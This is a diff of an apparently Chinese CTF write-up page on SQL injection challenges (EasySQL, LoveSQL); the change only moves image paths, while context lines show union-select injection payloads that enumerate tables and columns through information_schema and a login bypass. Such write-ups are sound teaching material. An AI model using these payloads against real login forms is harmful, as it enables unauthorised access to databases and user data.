@@ -599,10 +599,10 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>发现username和password都能注入，使用万能密码</p>
-<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806150937579.png" alt="image-20200806150937579"></p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806150937579.png" alt="image-20200806150937579"></p>
 <p>万能密码学习：<a href="https://blog.csdn.net/weixin_43952190/article/details/105696239" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43952190/article/details/105696239</a></p>
 <h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>按照上一题的思路万能密码得到admin的密码(但是好像并没有什么用emm</p>
-<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806151229803.png" alt="image-20200806151229803"></p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806151229803.png" alt="image-20200806151229803"></p>
 <p>判断字段为3</p>
 <p>?username=admin’ order by 4%23&amp;password=1</p>
 <p>注意:这里的注释#在输入框中输入时可以用#，而在地址栏时必须是%23</p>
@@ -610,10 +610,10 @@
 <p>注意:注入时不能使用admin,2,3位置会显示admin的数据</p>
 <p>答疑：为什么使用错误的username和password也会显示login success</p>
 <p>代码可能是这样写的：只要能查出结果，就能成功登录</p>
-<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806152232415.png" alt="image-20200806152232415"></p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806152232415.png" alt="image-20200806152232415"></p>
 <p>(感谢我伟大的web队友)</p>
 <p>得到数据库名geek</p>
-<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/Typora/image/image-20200806152437389.png" alt="image-20200806152437389"></p>
+<p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806152437389.png" alt="image-20200806152437389"></p>
 <p>?username=1’ union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=database()%23&amp;password=1</p>
 <p>得到两张表’geekuser,l0ve1ysq1’</p>
 <p>?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
